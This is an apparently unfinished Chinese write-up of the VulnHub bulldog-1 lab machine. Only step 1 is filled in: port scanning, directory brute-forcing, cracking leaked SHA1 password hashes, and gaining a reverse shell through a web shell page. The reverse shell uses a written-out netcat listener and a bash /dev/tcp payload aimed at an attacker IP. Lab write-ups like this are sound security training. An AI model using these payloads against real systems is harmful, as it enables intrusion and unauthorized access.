# VulnHub: bulldog-1
- https://www.vulnhub.com/entry/bulldog-1,211/
## Walkthrough
### Step 1
使用VirtualBox開啟虛擬機，可自動取得靶機ip
利用nmap掃port，http端口80、8080，ssh端口23皆為開放狀態
DirBuster爆破目錄，發現在/dev/中的source code有提示
> <!--Need these password hashes for testing. Django's default is too complex-->
	<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
把註解中的password拿去sha1 decode，求出nick跟sarah的password
試探用database(sarah)去登/admin/，成功，但無編輯權限
發現/dev/shell網頁，登入sarah後擁有權限，試圖用bash反彈shell，失敗，最後用echo成功
攻擊機:`nc -l 3333`
靶機shell欄位:`echo "bash -i >& /dev/tcp/10.10.10.10/3333 0>&1" | bash`
查看可疑user，發現bulldogadmin和django
查看bulldogadmin文件，發現可疑目錄/home/bulldogadmin/.hiddenadmindirectory
### Step 2
### Step 3
### Step 4
### Step 5
### Step 6
